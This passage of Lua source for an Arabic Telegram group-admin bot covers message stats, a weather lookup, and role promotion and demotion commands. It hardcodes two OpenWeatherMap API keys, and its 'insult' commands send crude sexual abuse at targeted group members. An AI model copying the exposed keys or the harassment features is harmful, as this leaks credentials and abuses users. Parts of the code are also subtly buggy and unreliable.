༯┆[DEVELOPER](https://t.me/lIGODlI)
⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠠𖧧
༯┆[TWSL SOURCE](t.me/HXOUSEXBOT) 
⌯ [@llX1X ▪️ @xo_e5 ▪️ @lIGODIl ⌯]
]]
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
--------hxouse 
if text == 'الكروبات' and is_admin(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
local hxouse = hxousedx1:scard(HXOUSE.."bot:groups")
local dx = hxousedx1:scard("hxouse:addg"..bot_id) or 0
local users = hxousedx1:scard(HXOUSE.."bot:userss")
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *Groups :*  '..gps..'', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ اعضاء الخاص { '..users..' }\n⌯︙ عدد كروبات { '..hxouse..' }\n⌯︙ الكروبات المفعله { '..dx..' }\n⌯︙ الغير مفعله {'..(hxouse - dx)..'} *', 1, 'md')
end
end  
if  text:match("^[Mm]sg$") or text:match("^رسائلي$") and msg.reply_to_message_id_ == 0  and hxouse11(msg) then
local user_msgs = hxousedx1:get(HXOUSE..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local hxouse = hxousedx1:get(HXOUSE..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local hxousey = (hxousedx1:get('hxouse:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ welcome my dear \n⌯︙ you have {*"..(user_msgs + hxousey).." }* msg \n⌯︙ in group ", 1, 'md')
else 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ اهلا وسهلا عزيزي \n⌯︙ رسائلك الحقيقيه {*"..user_msgs.." }* \n⌯︙ رسائلك المضافه {*"..hxousey.." }* \n⌯︙ رسائلك اليوم *{"..(hxouse).."} *\n⌯︙ مجموع رسائلك {*"..(user_msgs + hxousey).." }* \n⌯︙ في المجموعه ", 1, 'md')
end
end
if text:match("^[Gg]p id$") or text:match("^ايدي المجموعه$") and hxouse11(msg) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
texts = "⌯︙ Group ID ~ "..msg.chat_id_
else
texts = "⌯︙ ايدي المجموعه ~ "..msg.chat_id_
end
hxousedx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
-------------------------------------HXOUSE TEAM----------------------------------------------------------
if text:match("^ايديي$") and hxouse11(msg) then 
hxousedx(msg.chat_id_, msg.id_, 1,'. اهلا بك عزيزي  '..renk_hxouse(msg)..' \n . ايديك هو `'..msg.sender_user_id_..'`', 1, 'md') 
end
----------hxouse
if text:match("^[Mm]y username$") or text:match("^معرفي$")  and hxouse11(msg) then
function get_username(extra,result,success)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '⌯︙ Your Username ~ {User}'
else
text = '⌯︙ معرفك ~ {User}'
end
local text = text:gsub('{User}',('@'..result.username_ or ''))
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
-------------------------------------faedee----------------------------------------------------------
if text:match("^[Mm]y name$") or text:match("^اسمي$") and hxouse11(msg) then
function get_firstname(extra,result,success)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '⌯︙ your name ~ {firstname}'
else
text = '⌯︙ اسمك ~ {firstname}'
end
local text = text:gsub('{firstname}',(result.first_name_ or ''))
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
-------hxouse
if text:match('^الحساب (%d+)$') and hxouse11(msg) then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده العضو 🚸'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
--------------hxouse
if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") and hxouse11(msg) then
 
local text =  [[
⌯︙ رابط حذف التلي 
⌯︙ براحتك هو انت تطرب ع الحذف 
⌯︙ [ اضغط هنا لحذف الحساب ](https://telegram.org/deactivate) 
⌯︙ [ اضغط هنا لديك مفاجئه ](https://t.me/joinchat/AAAAAEyMJ12igMsiNeXNjw)
⌯︙ [ اضغط هنا لديك مفاجئه اخرى ](https://t.me/joinchat/AAAAAFRns8sOZdUdE6x1TQ) 
]]
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if text:match("^جهاتي$") and hxouse11(msg) then
add = (tonumber(hxousedx1:get(HXOUSE..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ عدد الجهات الي ضفتها  *{"..add.."}*", 1, 'md')
end
if text:match("^رسائلي اليوم$") and hxouse11(msg) then 
local hxouse = hxousedx1:get(HXOUSE..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ رسائلك اليوم *{"..(hxouse).."} *", 1, 'md')
end
------------------hxouse
if text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$") or text:match("^(طقس) (.*)$") and hxouse11(msg) then
  MatchesEN = {text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$")}; MatchesFA = {text:match("^(طقس) (.*)$")}
  Ptrn = MatchesEN[2] or MatchesFA[2]
  local function temps(K)
   local F = (K*1.8)-459.67
   local C = K-273.15
   return F,C
  end
  
  local res = http.request("http://api.openweathermap.org/data/2.5/weather?q="..URL.escape(Ptrn).."&appid=269ed82391822cc692c9afd59f4aabba")
  local jtab = json:decode(res)
  if jtab.name then
   if jtab.weather[1].main == "Thunderstorm" then
    status = "⛈ عاصف"
   elseif jtab.weather[1].main == "Drizzle" then
    status = "🌦 امطار خفيفه"
   elseif jtab.weather[1].main == "Rain" then
    status = "🌧 مطر شديد"
   elseif jtab.weather[1].main == "Snow" then
    status = "🌨 مثلج"
   elseif jtab.weather[1].main == "Atmosphere" then
    status = "🌫 مغبر"
   elseif jtab.weather[1].main == "Clear" then
    status = "🌤️ صاف"
   elseif jtab.weather[1].main == "Clouds" then
    status = "☁️ غائم"
   elseif jtab.weather[1].main == "Extreme" then
     status = "-------"
   elseif jtab.weather[1].main == "Additional" then
    status = "-------"
   else
    status = "-------"
   end
   local F1,C1 = temps(jtab.main.temp)
   local F2,C2 = temps(jtab.main.temp_min)
   local F3,C3 = temps(jtab.main.temp_max)
   if jtab.rain then
    rain = jtab.rain["3h"].." ميليمتر"
   else
    rain = "-----"
   end
   if jtab.snow then
    snow = jtab.snow["3h"].." ميليمتر"
   else
    snow = "-----"
   end
   today = "• اسم المدينه : *"..jtab.name.."*\n"
   .."• اسم الدوله : *"..(jtab.sys.country or "----").."*\n"
   .."• درجه الحراره :\n"
   .."   "..C1.."° سلليزي\n"
   .."   "..F1.."° فهرنهايت\n"
   .."   "..jtab.main.temp.."° كلفن\n"
   .."• الجو "..status.." تقريبا\n\n"
   .."• درجه حراره اليوم الصغرى : C"..C2.."°   F"..F2.."°   K"..jtab.main.temp_min.."°\n"
   .."• درجه حراره اليوم الكبرى : C"..C3.."°   F"..F3.."°   K"..jtab.main.temp_max.."°\n"
   .."• رطوبة الهواء : "..jtab.main.humidity.."%\n"
   .."• كثافه الغيوم : "..jtab.clouds.all.."%\n"
   .."• سرعه الرياح : "..(jtab.wind.speed or "------").." متر / ثانيه\n"
   .."• اتجاه الرياح : "..(jtab.wind.deg or "------").."° درجه\n"
   .."• تقلب الرياح : "..(jtab.main.pressure/1000).."\n"
   .."• اخر 3 ساعات من المطر : "..rain.."\n"
   .."• اخر 3 ساعات من تساقط الثلوج : "..snow.."\n\n"
   after = ""
   local res = http.request("http://api.openweathermap.org/data/2.5/weather?q="..URL.escape(Ptrn).."&appid=de8f6f3e0b7f8a36a3e05f47418643bf")
   local jtab = json:decode(res)
   for i=1,5 do
    local F1,C1 = temps(jtab.list[i].main.temp_min)
    local F2,C2 = temps(jtab.list[i].main.temp_max)
    if jtab.list[i].weather[1].main == "Thunderstorm" then
     status = "⛈ عاصف"
    elseif jtab.list[i].weather[1].main == "Drizzle" then
     status = "🌦 امطار خفيفه"
    elseif jtab.list[i].weather[1].main == "Rain" then
     status = "🌧 مطر شديد"
    elseif jtab.list[i].weather[1].main == "Snow" then
     status = "🌨 مثلج"
    elseif jtab.list[i].weather[1].main == "Atmosphere" then
     status = "🌫 مغبر"
    elseif jtab.list[i].weather[1].main == "Clear" then
     status = "🌤️صاف"
    elseif jtab.list[i].weather[1].main == "Clouds" then
     status = "☁️ غائم"
    elseif jtab.list[i].weather[1].main == "Extreme" then
     status = "-------"
    elseif jtab.list[i].weather[1].main == "Additional" then
     status = "-------"
    else
     status = "-------"
    end
    if i == 1 then
     day = "• طقس يوم غد"
    elseif i == 2 then
     day = "• طقس بعد غد"
    elseif i == 3 then
     day = "• طقس بعد 3 ايام"
    elseif i == 4 then
     day = "• طقس بعد 4 ايام"
    elseif i == 5 then
      day = "• طقس بعد 5 ايام"
    end
    after = after.."- "..day..status.."تقريبا \n🔺C"..C2.."°  *-*  F"..F2.."°\n🔻C"..C1.."°  *-*  F"..F1.."°\n"
   end
   Text = today.."• حاله الطقس ل5 ايام القادمه 🔽:\n"..after
   hxousedx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
  else
   Text  = "• لا توجد مدينه بهذا الاسم 🌐"
   hxousedx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
  end
 end
---------------hxouse
if (msg.sender_user_id_) then
local text = msg.content_.text_:gsub("[Pp]rice", "Nerkh")
if text:match("^[Nn]erkh$") or text:match("^المطور$") and hxouse11(msg) then
local nerkh = hxousedx1:get(HXOUSE.."nerkh")
if nerkh then
hxousedx(msg.chat_id_, msg.id_, 1, nerkh, 1, "md")
elseif hxousedx1:get(HXOUSE.."lang:gp:" .. msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Bot not found ", 1, "md")
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ لم يتم وضع كليشه المطور ", 1, "md")
end
end 
end 
---------------hxouse
if text and text:match('^هينه @(.*)')  then 
local username = text:match('^هينه @(.*)') 
function hxouse(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
hxousedx(msg.chat_id_, msg.id_, 1, 'يول شو تمسلت اكو واحد يهين نفسه ', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(bot_owner) then 
hxousedx(msg.chat_id_, msg.id_, 1, 'شو انت تمضرط تريد اهين تاج راسي مثلا ?', 1, 'md') 
return false  
end  
local hxouse = { "لك حيوان @"..username.." 100 نعال اسوكك بس تحجي فهمت ","لك فرخ @"..username.." اكل خره لا رجعك منين ما طلعت  ","حبيبي @"..username.." راح احاول احترمك هالمره بلكي تبطل حيونه ","فرخ دودكي  @"..username.." صير ادمي لا حطك بركبتي ",}
hxousedx(msg.chat_id_, result.id_, 1,''..hxouse[math.random(#hxouse)]..'', 1, 'html') 
else  
hxousedx(msg.chat_id_, msg.id_, 1, '🚸*¦*  العضو لا يوجد في المجموعه ', 1, 'md') 
end 
end 
resolve_username(username,hxouse)
end
------------------hxouse
if text:match("^هينه$") and hxouse11(msg) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
hxousedx(msg.chat_id_, msg.id_, 1, ' شكد غبي لعد 🌚?? تريدني اهين نفسي ؟ دكسمك 😌😂', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
hxousedx(msg.chat_id_, msg.id_, 1, ' دي لك تريد اهين تاج راسك ؟ 🌚', 1, 'md')
return false
end 
local hxouse = " صار ستاذي 😌" 
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md') 
local hxouse = {" ها لك جرجف اليوم اكتلك واخري ع كبرك 😈"," حضينه مستنقع الجبات صير عاقل لا اهفك بالنعال 😒"," قاروره جاروره بلاع العيوره لا تندك باسيادك 😒"," خاب دي لا احط بكسمك الديفدي واركعك بعير ثري دي  فرخي ابن جبتي 😒"} 
hxousedx(msg.chat_id_, result.id_, 1,''..hxouse[math.random(#hxouse)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") and hxouse11(msg) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
hxousedx(msg.chat_id_, msg.id_, 1, ' حياتي بس فهمني شون ابوس نفسي وتدلل 😔😂', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
hxousedx(msg.chat_id_, msg.id_, 1, ' اموووووووواح احلا بوسه لمطوري 😻', 1, 'md')
return false
end 
local hxouse = " صار ستاذي راح اتماصص وياه 🙊😻" 
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md') 
local hxouse = {" تعالي حياتي خل نتماصص 😻👏"," اممممووووواااااح لصق الشفه 😻"," امح امح امح امح بوسه لو عسل 😼😻"} 
hxousedx(msg.chat_id_, result.id_, 1,''..hxouse[math.random(#hxouse)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") and hxouse11(msg) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
hxousedx(msg.chat_id_, msg.id_, 1, ' حياتي بس فهمني شون ابوس نفسي وتدلل 😔😂', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
hxousedx(msg.chat_id_, msg.id_, 1, ' اموووووووواح احلا بوسه لمطوري 😻', 1, 'md')
return false
end 
local hxouse = " صار ستاذي راح اتماصص وياه 🙊😻" 
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md') 
local hxouse = {" تعالي حياتي خل نتماصص 😻👏"," اممممووووواااااح لصق الشفه 😻"," امح امح امح امح بوسه لو عسل 😼😻"} 
hxousedx(msg.chat_id_, result.id_, 1,''..hxouse[math.random(#hxouse)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end


-----------Set Sudo3------------
if is_sudo(msg) then
if text ==('رفع مطور رتبه ثالثه') and hxouse11(msg) then
function sudo_reply(extra, result, success)
hxousedx1:sadd(HXOUSE..'bot:admins:',result.sender_user_id_)
setdev3(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and text:match('^رفع مطور رتبه ثالثه @(.*)') and hxouse11(msg) then
local username = text:match('^رفع مطور رتبه ثالثه @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:sadd(HXOUSE..'bot:admins:',result.id_)
setdev3(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مطور رتبه ثالثه (%d+)') then
local user = text:match('رفع مطور رتبه ثالثه (%d+)')
hxousedx1:sadd(HXOUSE..'bot:admins:',user)
setdev3(msg,msg.chat_id_,user)
end
----------------Rem Sudo3-----------
if text ==('تنزيل مطور رتبه ثالثه') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:srem(HXOUSE..'bot:admins:',result.sender_user_id_)
deldev3(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مطور رتبه ثالثه @(.*)') and hxouse11(msg) then
local username = text:match('^تنزيل مطور رتبه ثالثه @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:srem(HXOUSE..'bot:admins:',result.id_)
deldev3(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مطور رتبه ثالثه (%d+)') and hxouse11(msg) then
local user = text:match('تنزيل مطور رتبه ثالثه (%d+)')
hxousedx1:srem(HXOUSE..'bot:admins:',user)
deldev3(msg,msg.chat_id_,user)
end end
-----------Set Onall------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير عام') and hxouse11(msg) then
function raf_reply(extra, result, success)
hxousedx1:sadd(HXOUSE..'bot:onall:',result.sender_user_id_)
setonall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') and hxouse11(msg) then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:sadd(HXOUSE..'bot:onall:',result.id_)
setonall(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مدير عام (%d+)') and hxouse11(msg) then
local user = text:match('رفع مدير عام (%d+)')
hxousedx1:sadd(HXOUSE..'bot:onall:',user)
setonall(msg,msg.chat_id_,user)
end
----------------Rem Onall-----------
if text ==('تنزيل مدير عام') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:srem(HXOUSE..'bot:onall:',result.sender_user_id_)
delonall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') and hxouse11(msg) then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:srem(HXOUSE..'bot:onall:',result.id_)
delonall(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير عام (%d+)') and hxouse11(msg) then
local user = text:match('تنزيل مدير عام (%d+)')
hxousedx1:srem(HXOUSE..'bot:onall:',user)
delonall(msg,msg.chat_id_,user)
end end
-----------Set Moall------------
if is_onall(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if text ==('رفع ادمن عام') then
function raf_reply(extra, result, success)
hxousedx1:sadd(HXOUSE..'bot:moall:',result.sender_user_id_)
setmoall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and hxouse11(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:sadd(HXOUSE..'bot:moall:',result.id_)
setmoall(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن عام (%d+)') and hxouse11(msg) then
local user = text:match('رفع ادمن عام (%d+)')
hxousedx1:sadd(HXOUSE..'bot:moall:',user)
setmoall(msg,msg.chat_id_,user)
end
----------------Rem Moall-----------
if text ==('تنزيل ادمن عام') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:srem(HXOUSE..'bot:moall:',result.sender_user_id_)
delmoall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and hxouse11(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:srem(HXOUSE..'bot:moall:',result.id_)
delmoall(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن عام (%d+)') and hxouse11(msg) then
local user = text:match('تنزيل ادمن عام (%d+)')
hxousedx1:srem(HXOUSE..'bot:moall:',user)
delmoall(msg,msg.chat_id_,user)
end end
-----------Set Vipall------------
if is_moall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز عام') and hxouse11(msg) then
function raf_reply(extra, result, success)
hxousedx1:sadd(HXOUSE..'bot:vpall:',result.sender_user_id_)
setvipall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and hxouse11(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:sadd(HXOUSE..'bot:vpall:',result.id_)
setvipall(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز عام (%d+)') and hxouse11(msg) then
local user = text:match('رفع مميز عام (%d+)')
hxousedx1:sadd(HXOUSE..'bot:vpall:',user)
setvipall(msg,msg.chat_id_,user)
end
----------------Rem Vipall-----------
if text ==('تنزيل مميز عام') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:srem(HXOUSE..'bot:vpall:',result.sender_user_id_)
delvipall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and hxouse11(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:srem(HXOUSE..'bot:vpall:',result.id_)
delvipall(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز عام (%d+)') and hxouse11(msg) then
local user = text:match('تنزيل مميز عام (%d+)')
hxousedx1:srem(HXOUSE..'bot:vpall:',user)
delvipall(msg,msg.chat_id_,user)
end end
-----------Set Monsh------------
if is_vpall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ اساسي') and hxouse11(msg) then
function raf_reply(extra, result, success)
hxousedx1:sadd(HXOUSE..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
setmonsh(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and hxouse11(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:sadd(HXOUSE..'bot:monsh:'..msg.chat_id_,result.id_)
setmonsh(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and hxouse11(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
hxousedx1:sadd(HXOUSE..'bot:monsh:'..msg.chat_id_,user)
setmonsh(msg,msg.chat_id_,user)
end
----------------Rem Monsh-----------
if text ==('تنزيل منشئ اساسي') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:srem(HXOUSE..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
delmonsh(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and hxouse11(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:srem(HXOUSE..'bot:monsh:'..msg.chat_id_,result.id_)
delmonsh(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and hxouse11(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
hxousedx1:srem(HXOUSE..'bot:monsh:'..msg.chat_id_,user)
delmonsh(msg,msg.chat_id_,user)
end end
-----------Set Monsh2------------
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ') and hxouse11(msg) then
function raf_reply(extra, result, success)
hxousedx1:sadd(HXOUSE..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
setmonsh2(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and hxouse11(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:sadd(HXOUSE..'bot:monsh2:'..msg.chat_id_,result.id_)
setmonsh2(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and hxouse11(msg) then
local user = text:match('رفع منشئ (%d+)')
hxousedx1:sadd(HXOUSE..'bot:monsh2:'..msg.chat_id_,user)
setmonsh2(msg,msg.chat_id_,user)
end
----------------Rem Monsh2-----------
if text ==('تنزيل منشئ') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:srem(HXOUSE..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
delmonsh2(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and hxouse11(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:srem(HXOUSE..'bot:monsh2:'..msg.chat_id_,result.id_)
delmonsh2(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and hxouse11(msg) then
local user = text:match('تنزيل منشئ (%d+)')
hxousedx1:srem(HXOUSE..'bot:monsh2:'..msg.chat_id_,user)
delmonsh2(msg,msg.chat_id_,user)
end end
-----------Set Owner------------
if is_monsh2(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:sadd(HXOUSE..'bot:owners:'..msg.chat_id_,result.sender_user_id_)
setowner(msg,msg.chat_id_,result.sender_user_id_)
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and hxouse11(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:sadd(HXOUSE..'bot:owners:'..msg.chat_id_,result.id_)
setowner(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and hxouse11(msg) then
local user = text:match('رفع مدير (%d+)')
hxousedx1:sadd(HXOUSE..'bot:owners:'..msg.chat_id_,user)
setowner(msg,msg.chat_id_,user)
end
----------------Rem Owner-----------
if text ==('تنزيل مدير') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_,result.sender_user_id_)
delowner(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
